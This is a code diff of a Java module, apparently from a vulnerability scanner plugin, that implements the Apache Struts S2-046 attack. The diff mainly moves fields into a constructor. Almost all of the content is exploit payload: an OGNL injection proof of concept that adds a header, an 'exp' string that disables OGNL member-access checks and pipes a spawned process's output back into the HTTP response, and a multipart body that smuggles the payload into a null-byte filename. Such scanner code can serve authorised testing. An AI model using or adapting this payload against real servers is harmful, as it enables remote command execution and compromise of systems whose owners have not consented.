@@ -6,8 +6,18 @@ import java.util.Collections;
 import java.util.List;
 
 public class S2_046 extends IModule {
-    public String poc = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xxx','"+injectMark[0]+"'+'"+injectMark[1]+"')}";
-    public String exp =
+    public String contentType = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2";
+    public String requestBody =
+            "------WebKitFormBoundaryXd004BVJN9pBYBL2\r\n" +
+                    "Content-Disposition: form-data; name=\"upload\"; filename=\"{payload}"+new String(new byte[]{0x00})+".\"\r\n" +
+                    "Content-Type: text/plain\r\n" +
+                    "\r\n" +
+                    "foo\r\n" +
+                    "------WebKitFormBoundaryXd004BVJN9pBYBL2--";
+
+    public S2_046() {
+        poc = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xxx','"+injectMark[0]+"'+'"+injectMark[1]+"')}";
+        exp =
             "%{" +
             "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" +
             ".(" +
@@ -30,16 +40,7 @@ public class S2_046 extends IModule {
             ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))" +
             ".(#ros.flush())" +
             "}";
-
-
-    public String contentType = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2";
-    public String requestBody =
-            "------WebKitFormBoundaryXd004BVJN9pBYBL2\r\n" +
-            "Content-Disposition: form-data; name=\"upload\"; filename=\"{payload}"+new String(new byte[]{0x00})+".\"\r\n" +
-            "Content-Type: text/plain\r\n" +
-            "\r\n" +
-            "foo\r\n" +
-            "------WebKitFormBoundaryXd004BVJN9pBYBL2--";
+    }
 
     @Override
     public IScanIssue start() {
